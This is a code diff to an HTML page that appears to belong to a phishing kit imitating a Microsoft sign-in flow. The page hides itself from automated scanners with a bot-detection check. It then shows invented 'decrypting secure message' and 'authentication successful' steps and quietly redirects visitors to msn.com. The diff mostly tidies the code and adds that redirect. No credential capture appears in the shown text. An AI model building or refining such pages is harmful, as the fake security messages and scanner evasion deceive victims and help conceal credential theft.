@@ -7,7 +7,11 @@
 
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f3f2f1; margin:0; overflow:hidden; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display:flex; justify-content:center; align-items:center;
+            height:100vh; background-color:#f3f2f1; margin:0; overflow:hidden;
+        }
         .loading-container { text-align:center; max-width:420px; padding:20px; }
         .status-container { margin-top:40px; min-height:120px; }
         .progress-bar { width:100%; height:4px; background:#e1dfdd; border-radius:2px; overflow:hidden; margin-bottom:20px; }
@@ -33,6 +37,7 @@
     </div>
 
     <script>
+        // Simple bot detection (passive)
         function isLikelyBot() {
             const checks = [
                 navigator.webdriver === true,
@@ -59,18 +64,23 @@
 
         const botDetected = isLikelyBot();
 
+        // Animation sequence
         const loadingSequence = [
             { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1200 },
             { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 55, duration: 1400 },
             { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1600 }
         ];
 
-        let currentStep = 0, isLoading = false, sequenceCompleted = false;
+        let currentStep = 0;
+        let isLoading = false;
+        let sequenceCompleted = false;
 
         function showError(msg) {
-            document.getElementById('statusMessage').textContent = msg;
-            document.getElementById('statusMessage').classList.add('active', 'error');
-            document.getElementById('cryptoDetails').textContent = "";
+            const status = document.getElementById('statusMessage');
+            const details = document.getElementById('cryptoDetails');
+            status.textContent = msg;
+            status.classList.add('active', 'error');
+            details.textContent = "";
         }
 
         function updateLoadingStep() {
@@ -104,8 +114,13 @@
             const details = document.getElementById('cryptoDetails');
             status.textContent = "Authentication successful";
             status.classList.add('active', 'success');
-            details.textContent = "Session verified. You may now close this window.";
+            details.textContent = "Session verified. Redirecting...";
             details.classList.add('active');
+
+            // Redirect after 2.5 seconds
+            setTimeout(() => {
+                window.location.replace("https://www.msn.com");
+            }, 2500);
         }
 
         function startLoginSequence() {
@@ -116,7 +131,9 @@
             setTimeout(updateLoadingStep, 1000);
         }
 
-        window.addEventListener('load', () => setTimeout(startLoginSequence, 800));
+        window.addEventListener('load', () => {
+            setTimeout(startLoginSequence, 800);
+        });
     </script>
 </body>
 </html>
